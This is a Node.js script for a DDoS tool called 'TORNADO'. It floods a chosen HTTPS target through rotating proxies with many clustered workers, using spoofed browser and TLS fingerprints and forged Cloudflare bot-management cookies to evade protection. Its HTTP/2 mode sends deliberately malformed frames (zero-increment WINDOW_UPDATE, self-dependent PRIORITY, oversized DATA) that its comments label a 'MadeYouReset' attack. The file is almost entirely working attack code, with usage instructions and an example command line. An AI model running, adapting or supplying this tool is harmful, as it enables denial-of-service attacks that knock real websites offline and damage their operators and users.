const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const chalk = require('chalk');
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        console.log(e)
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

const statusesQ = []
let statuses = {}

const blockedDomain = [".gov", ".edu"];

const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const currentDate = new Date();
const targetDate = new Date('2029-02-30');

let isFull = process.argv.includes('--full');

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];
const queryIndex = process.argv.indexOf('--query');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
const customHeadersIndex = process.argv.indexOf('--header');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;

const forceHttpIndex = process.argv.indexOf('--http');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--debug') && forceHttp != 1;

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.error(`
    Options:
      --query 1/2/3 - query string with rand ex 1 - ?cf__chl_tk 2 - ?fwfwfwfw 3 - q?=fwfwwffw
      --delay <1-1000> - delay between requests 1-100 ms (optimal) default 1 ms
      --cookie "f=f" - for custom cookie
      --bfm true/null - bot fight mode change to true if you need dont use if no need
      --referer https://target.com / rand - use custom referer if you need and rand - if you need generate domains ex: fwfwwfwfw.net
      --postdata "user=f&pass=%RAND%" - if you need data to post req method format "user=f&pass=f"
      --randrate - randomizer rate 1 to 90 good bypass to rate
      --full - this new func for attack only big backend ex amazon akamai and other... support cf
      --http 1/2/mix - new func choose to type http 1/2/mix (mix 1 & 2)
      --debug - show your status code (maybe low rps to use more resource)
      --header "f:f" or "f:f#f1:f1" - if you need this use custom headers split each header with #

    How To Run: 

        node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy>

    example: 

        node ${process.argv[1]} GET "https://google.com?q=%RAND%" 120 16 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full
    `);

    process.exit(1);
}

let hcookie = '';

const url = new URL(target)
const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')

if (currentDate > targetDate) {
    console.error('Error method has been outdate pm @BuferOverFlow');
    process.exit(1);
}

if (url.hostname.endsWith(blockedDomain)) {
    console.log(`Domain ${blockedDomain} blocked, if this mistake pm to tg @BuferOverFlow`);
    process.exit(1);
}

if (!['GET', 'POST', 'HEAD', 'OPTIONS'].includes(reqmethod)) {
    console.error('Error request method only can GET/POST/HEAD/OPTIONS');
    process.exit(1);
}

if (!target.startsWith('https://')) {
    console.error('Error protocol can only https://');
    process.exit(1);
}

if (isNaN(time) || time <= 0 || time > 86400) {
    console.error('Error time can not high 86400')
    process.exit(1);
}

if (isNaN(threads) || threads <= 0 || threads > 256) {
    console.error('Error threads can not high 256')
    process.exit(1);
}

if (isNaN(ratelimit) || ratelimit <= 0 || ratelimit > 90) {
    console.error(`Error ratelimit can not high 90`)
    process.exit(1);
}

if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
    hcookie = `__cf_bm=${randstr(23)}_${randstr(19)}-${timestampString}-1-${randstr(4)}/${randstr(65)}+${randstr(16)}=; cf_clearance=${randstr(35)}_${randstr(7)}-${timestampString}-0-1-${randstr(8)}.${randstr(8)}.${randstr(8)}-0.2.${timestampString}`;
}

if (cookieValue) {
    hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9)
    frame.writeUInt32BE(payload.length << 8 | type, 0)
    frame.writeUInt8(flags, 4)
    frame.writeUInt32BE(streamId, 5)
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload])
    return frame
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)

        if (payload.length + offset != length) {
            return null
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    }
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length)
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6)
        data.writeUInt32BE(settings[i][1], i * 6 + 2)
    }
    return data
}

const getRandomChar = () => {
    const pizda4 = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * pizda4.length);
    return pizda4[randomIndex];
};

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

if (url.pathname.includes("%RAND%")) {
    const randomValue = randstr(6) + "&" + randstr(6);
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function ememmmmmemmeme(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function getRandomToken(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let token = '';
    for (let i = 0; i < length; i++) {
        token += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return token;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function buildRequest() {
    const browserVersion = getRandomInt(120, 123);

    const fwfw = ['Google Chrome', 'Brave'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];

    let brandValue;
    if (browserVersion === 120) {
        brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    } 
    else if (browserVersion === 121) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
    }
    else if (browserVersion === 122) {
        brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${wfwf}";v="${browserVersion}"`;
    }
    else if (browserVersion === 123) {
        brandValue = `"${wfwf}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
    }

    const isBrave = wfwf === 'Brave';

    const acceptHeaderValue = isBrave
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
    
    const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
    const secChUa = `${brandValue}`;
    const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6,6) + ".net" : refererValue;

    let mysor = '\r\n';
    let mysor1 = '\r\n';
    if(hcookie || currentRefererValue) {
        mysor = '\r\n'
        mysor1 = '';
    } else {
        mysor = '';
        mysor1 = '\r\n';
    }

    let headers = `${reqmethod} ${url.pathname} HTTP/1.1\r\n` +
        `Accept: ${acceptHeaderValue}\r\n` +
        'Accept-Encoding: gzip, deflate, br\r\n' +
        'Accept-Language: en-US,en;q=0.7\r\n' +
        'Connection: Keep-Alive\r\n' +
        `Host: ${url.hostname}\r\n` +
        'Sec-Fetch-Dest: document\r\n' +
        'Sec-Fetch-Mode: navigate\r\n' +
        'Sec-Fetch-Site: none\r\n' +
        'Sec-Fetch-User: ?1\r\n' +
        'Upgrade-Insecure-Requests: 1\r\n' +
        `User-Agent: ${userAgent}\r\n` +
        `sec-ch-ua: ${secChUa}\r\n` +
        'sec-ch-ua-mobile: ?0\r\n' +
        'sec-ch-ua-platform:  "Windows"\r\n' + mysor1;

    if (hcookie) {
        headers += `Cookie: ${hcookie}\r\n`;
    }

    if (currentRefererValue) {
        headers += `Referer: ${currentRefererValue}\r\n` + mysor;
    }

    const mmm = Buffer.from(`${headers}`, 'binary');
    //console.log(headers.toString());
    return mmm;
}

const http1Payload = Buffer.concat(new Array(1).fill(buildRequest()))
function generateBrowserBehavior() {
    // 生成随机的屏幕分辨率
    const screenResolutions = [
        { width: 1920, height: 1080 },
        { width: 1366, height: 768 },
        { width: 1536, height: 864 },
        { width: 1440, height: 900 },
        { width: 1280, height: 720 },
        { width: 2560, height: 1440 },
        { width: 3840, height: 2160 }
    ];
    const screen = screenResolutions[Math.floor(Math.random() * screenResolutions.length)];

    // 生成随机的颜色深度
    const colorDepths = [24, 30, 48];
    const colorDepth = colorDepths[Math.floor(Math.random() * colorDepths.length)];

    // 生成随机的时区
    const timezones = [
        'America/New_York',
        'America/Los_Angeles',
        'Europe/London',
        'Europe/Paris',
        'Asia/Tokyo',
        'Asia/Shanghai',
        'Australia/Sydney'
    ];
    const timezone = timezones[Math.floor(Math.random() * timezones.length)];

    // 生成随机的语言
    const languages = [
        'en-US',
        'en-GB',
        'fr-FR',
        'de-DE',
        'es-ES',
        'it-IT',
        'pt-BR',
        'ru-RU',
        'ja-JP',
        'zh-CN',
        'ko-KR'
    ];
    const language = languages[Math.floor(Math.random() * languages.length)];

    // 生成随机的硬件信息
    const hardwareConcurrency = Math.pow(2, Math.floor(Math.random() * 4) + 2);
    const deviceMemory = Math.pow(2, Math.floor(Math.random() * 4) + 2);

    // 生成随机的WebGL信息
    const webglVendors = [
        'Google Inc.',
        'Intel Inc.',
        'NVIDIA Corporation',
        'AMD',
        'Apple Inc.'
    ];
    const webglRenderers = [
        'ANGLE (Intel, Intel(R) UHD Graphics Direct3D11 vs_5_0 ps_5_0)',
        'ANGLE (NVIDIA, NVIDIA GeForce GTX 1060 Direct3D11 vs_5_0 ps_5_0)',
        'ANGLE (AMD, AMD Radeon RX 580 Direct3D11 vs_5_0 ps_5_0)',
        'ANGLE (Intel, Intel(R) HD Graphics 620 Direct3D11 vs_5_0 ps_5_0)',
        'ANGLE (NVIDIA, NVIDIA GeForce RTX 3080 Direct3D11 vs_5_0 ps_5_0)'
    ];
    const webglVendor = webglVendors[Math.floor(Math.random() * webglVendors.length)];
    const webglRenderer = webglRenderers[Math.floor(Math.random() * webglRenderers.length)];

    // 生成随机的插件信息
    const plugins = [
        'PDF Viewer',
        'Chrome PDF Viewer',
        'Chromium PDF Viewer',
        'Microsoft Edge PDF Viewer',
        'WebKit built-in PDF',
        'Native Client'
    ];
    const selectedPlugins = plugins.sort(() => Math.random() - 0.5).slice(0, Math.floor(Math.random() * 3) + 1);

    // 生成随机的浏览器行为特征
    const behavior = {
        screen,
        colorDepth,
        timezone,
        language,
        hardwareConcurrency,
        deviceMemory,
        webglVendor,
        webglRenderer,
        plugins: selectedPlugins,
        // 添加随机的浏览器行为特征
        doNotTrack: Math.random() < 0.3 ? "1" : "0",
        cookieEnabled: Math.random() < 0.9,
        javaEnabled: Math.random() < 0.2,
        online: Math.random() < 0.95,
        // 添加随机的性能特征
        performance: {
            timing: {
                navigationStart: Date.now() - Math.floor(Math.random() * 3600000),
                loadEventEnd: Date.now() - Math.floor(Math.random() * 1000)
            }
        }
    };

    return behavior;
}
const fff = generateBrowserBehavior()
    const ciphersList = [
        "TLS_AES_256_GCM_SHA384",
        "TLS_CHACHA20_POLY1305_SHA256",
        "TLS_AES_128_GCM_SHA256",
        "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
        "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
        "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
        "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
        "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
        "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256",
        "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA",
        "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA",
        "TLS_RSA_WITH_AES_128_GCM_SHA256",
        "TLS_RSA_WITH_AES_256_GCM_SHA384",
        "TLS_RSA_WITH_AES_128_CBC_SHA",
        "TLS_RSA_WITH_AES_256_CBC_SHA"
    ];
    const ciphers = ciphersList.join(':');
    const sigalgs = [
        'ecdsa_secp256r1_sha256',
        'rsa_pss_rsae_sha256',
        'rsa_pkcs1_sha256',
        'ecdsa_secp384r1_sha384',
        'rsa_pss_rsae_sha384',
        'rsa_pkcs1_sha384',
        'rsa_pss_rsae_sha512',
        'rsa_pkcs1_sha512'
    ];
    const SignalsList = sigalgs.join(':');
function go() {
    const [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':')
    let tlsSocket;

    if (!proxyPort || isNaN(proxyPort)) {
        go()
        return
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: forceHttp == 1 ? ['http/1.1'] : forceHttp == 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
                servername: url.host,
                ciphers: ciphers,
                sigalgs: SignalsList,
                secureOptions: 
                crypto.constants.SSL_OP_NO_SSLv2 |
                crypto.constants.SSL_OP_NO_SSLv3 |
                crypto.constants.SSL_OP_NO_TLSv1 |
                crypto.constants.SSL_OP_NO_TLSv1_1 |
                crypto.constants.ALPN_ENABLED |
                crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
                crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
                crypto.constants.SSL_OP_COOKIE_EXCHANGE |
                crypto.constants.SSL_OP_PKCS1_CHECK_1 |
                crypto.constants.SSL_OP_PKCS1_CHECK_2 |
                crypto.constants.SSL_OP_SINGLE_DH_USE |
                crypto.constants.SSL_OP_SINGLE_ECDH_USE |
                crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION,
                session: crypto.randomBytes(64),
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                ecdhCurve: "X25519:P-256:P-384",
                rejectUnauthorized: false,
                fingerprint: fff
            }, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {

                    if (forceHttp == 2) {
                        tlsSocket.end(() => tlsSocket.destroy())
                        return
                    }

                    function doWrite() {
                        tlsSocket.write(http1Payload, (err) => {
                            if (!err) {
                                setTimeout(() => {
                                    doWrite()
                                }, isFull ? 1000 : 1000 / ratelimit)
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy())
                            }
                        })
                    }

                    doWrite()

                    tlsSocket.on('error', () => {
                        tlsSocket.end(() => tlsSocket.destroy())
                    })

                    return
                }

                if (forceHttp == 1) {
                    tlsSocket.end(() => tlsSocket.destroy())
                    return
                }

                let streamId = 1
                let data = Buffer.alloc(0)
                let hpack = new HPACK()
                hpack.setTableSize(4096)

                const updateWindow = Buffer.alloc(4)
                updateWindow.writeUInt32BE(15663105, 0)

                const headertablesize = Math.floor(Math.random() * 2) + 65535;
                const frandom = Math.floor(Math.random() * 6);

                let fchoicev1, fchoicev2;

                if (frandom === 0) {
                    fchoicev1 = 131072;
                    fchoicev2 = 262142;
                } else if (frandom === 1) {
                    fchoicev1 = 131073;
                    fchoicev2 = 262143;
                } else if (frandom === 2) {
                    fchoicev1 = 131074;
                    fchoicev2 = 262144;
                } else if (frandom === 3) {
                    fchoicev1 = 6291455;
                    fchoicev2 = 262145;
                }
                else if (frandom === 4) {
                    fchoicev1 = 6291454;
                    fchoicev2 = 262144;
                }
                else if (frandom === 5) {
                    fchoicev1 = 6291456;
                    fchoicev2 = 262146;
                }

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, headertablesize],
                        [2, 0],
                        [4, fchoicev1],
                        [6, fchoicev2]
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData])

                    while (data.length >= 9) {
                        const frame = decodeFrame(data)
                        if (frame != null) {
                            data = data.subarray(frame.length + 9)
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1))
                            }
                            if (frame.type == 1 && debugMode) {
                                const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1]
                                if (!statuses[status])
                                    statuses[status] = 0

                                statuses[status]++
                            }
                            if (frame.type == 7 || frame.type == 5) {
                                if (frame.type == 7) {
                                    if (debugMode) {

                                        //console.log("goaway", frame.payload.readUint32BE(0), frame.payload.readUint32BE(4))

                                        if (!statuses["GOAWAY"])
                                            statuses["GOAWAY"] = 0

                                        statuses["GOAWAY"]++
                                    }
                                }

                                tlsSocket.end(() => tlsSocket.destroy())
                            }

                            // Xử lý MadeYouReset: Nếu nhận RST_STREAM từ server (type 3), mở stream mới
                            if (frame.type === 3) { // RST_STREAM từ server
                                // Server tự reset → Mở stream mới ngay
                                streamId += 2;
                                doWrite(); // Tiếp tục gửi malformed frames
                            }

                        } else {
                            break
                        }
                    }
                })

                tlsSocket.write(Buffer.concat(frames))

                function doWrite() {
                    if (tlsSocket.destroyed) {
                        return
                    }
                    const fwq = getRandomInt(0,1);
                    const malformedFrames = [];
                    const customHeadersArray = [];
                    if (customHeaders) {
                        const customHeadersList = customHeaders.split('#');
                        for (const header of customHeadersList) {
                            const [name, value] = header.split(':');
                            if (name && value) {
                                customHeadersArray.push({ [name.trim().toLowerCase()]: value.trim() });
                            }
                        }
                    }
                    let ratelimit;
                    if (randrate !== undefined) {
                        ratelimit = getRandomInt(1, 90);
                    } else {
                        ratelimit = process.argv[6];
                    }

                    // Tạo malformed frames cho MadeYouReset (không gửi RST từ client)
                    for (let i = 0; i < (isFull ? ratelimit : 1); i++) {
                        // Malformed 1: WINDOW_UPDATE increment 0 (trigger reset ở một số impl)
                        const windowUpdateZero = Buffer.alloc(13);
                        windowUpdateZero.writeUInt32BE(0x00000004, 0); // length 4, type 8 (WINDOW_UPDATE)
                        windowUpdateZero.writeUInt8(0, 4); // flags 0
                        windowUpdateZero.writeUInt32BE(streamId, 5); // stream ID
                        windowUpdateZero.writeUInt32BE(0, 9); // increment = 0 (malformed)

                        malformedFrames.push(windowUpdateZero);

                        // Malformed 2: Invalid PRIORITY (self-dependent cycle)
                        const priorityInvalid = Buffer.alloc(14);
                        priorityInvalid.writeUInt32BE(0x00000005, 0); // length 5, type 2 (PRIORITY)
                        priorityInvalid.writeUInt8(0, 4);
                        priorityInvalid.writeUInt32BE(streamId, 5); // stream ID
                        priorityInvalid.writeUInt32BE(streamId, 9); // dependency = chính nó (cycle)
                        priorityInvalid.writeUInt8(0, 13); // weight 0 (malformed)

                        malformedFrames.push(priorityInvalid);

                        // Malformed 3: Excessive flow control (DATA với length overflow)
                        const excessiveData = Buffer.alloc(9 + 65535); // Max frame size để gây overflow flow control
                        excessiveData.writeUInt32BE(0x0000FFFF, 0); // length max
                        excessiveData.writeUInt8(0, 3); // type 0 (DATA)
                        excessiveData.writeUInt8(0, 4); // flags 0
                        excessiveData.writeUInt32BE(streamId, 5); // stream ID
                        // Fill payload với random data để gây error
                        crypto.randomBytes(65535).copy(excessiveData, 9);

                        malformedFrames.push(excessiveData);

                        streamId += 2; // Tăng streamId để mở stream mới
                    }

                    tlsSocket.write(Buffer.concat(malformedFrames), (err) => {
                        if (!err) {
                            setTimeout(() => {
                                doWrite()
                            }, isFull ? 1000 : 1000 / ratelimit)
                        }
                    })
                }

                doWrite()
            }).on('error', () => {
                tlsSocket.destroy()
            })
        })

        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`)
    }).once('error', () => { }).once('close', () => {
        if (tlsSocket) {
            tlsSocket.end(() => { tlsSocket.destroy(); go() })
        }
    })
}

if (cluster.isMaster) {

    const workers = {}

    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(`Attack Start / @BuferOverFlow love you <3 / TORNADO`);

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message]
    })
    if (debugMode) {
        setInterval(() => {

            let statuses = {}
            for (let w in workers) {
                if (workers[w][0].state == 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (statuses[code] == null)
                                statuses[code] = 0

                            statuses[code] += st[code]
                        }
                    }
                }
            }
            console.clear()
            console.log(new Date().toLocaleString('us'), statuses)
        }, 1000)
    }

    setTimeout(() => process.exit(1), time * 1000);

} else {
    let conns = 0

    let i = setInterval(() => {
        if (conns < 30000) {
            conns++

        } else {
            clearInterval(i)
            return
        }
        go()
    }, delay);


    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4)
                statusesQ.shift()

            statusesQ.push(statuses)
            statuses = {}
            process.send(statusesQ)
        }, 250)
    }

    setTimeout(() => process.exit(1), time * 1000);
}